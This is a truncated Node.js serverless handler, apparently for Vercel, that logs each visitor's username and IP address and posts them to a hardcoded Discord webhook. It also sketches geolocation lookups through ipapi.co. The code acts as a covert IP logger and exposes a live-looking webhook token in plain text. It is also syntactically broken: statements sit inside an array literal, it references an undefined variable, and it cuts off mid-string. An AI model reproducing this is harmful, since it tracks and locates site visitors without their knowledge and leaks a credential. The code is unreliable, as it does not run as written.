const fetch = require('node-fetch');

module.exports = async (req, res) => {
    if (req.method === 'POST') {
        try {
            const { username } = req.body;
            const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

            const discordWebhookUrl = "https://discord.com/api/webhooks/1364216447793889280/WG6gK4Nz5hGD8iOBp21SwbkfdmZW2ZzezOvWNYa6hiK5tSHjut6d1eObPbRqsn4f-lUv"; // Store in Vercel environment variables

            if (!discordWebhookUrl) {
                console.error('Discord webhook URL not set in environment variables.');
                return res.status(500).json({ error: 'Webhook URL not configured.' });
            }

            const payload = {
                embeds: [{
                    title: 'New Website Visit',
                    fields: [
                        { name: 'Username', value: username },
                        { name: 'IP Address', value: ipAddress }
                        // You could try to use a free IP geolocation API here, but be mindful of rate limits and reliability.
                         
                         const geoResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                         const geoData = await geoResponse.json();
                         if (geoData.city) {
                             fields.push({ name: 'City', value: geoData.city });
                         }
                         if (geoData.country_name) {
                             fields.push({ name: 'Country', value: geoData.country_name });
                        }
                    ],
                    timestamp: new Date().toISOString(),
                }]
            };

            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            });

            if (response.ok) {
                return res.status(200).json({ success: true, message: 'Data sent to Discord.' });
            } else {
                console.error('Failed to send data to Discord:', response.status, response.statusText);
                return res.status(500).json({ error: 'Failed to send data to Dis
                  cord.'
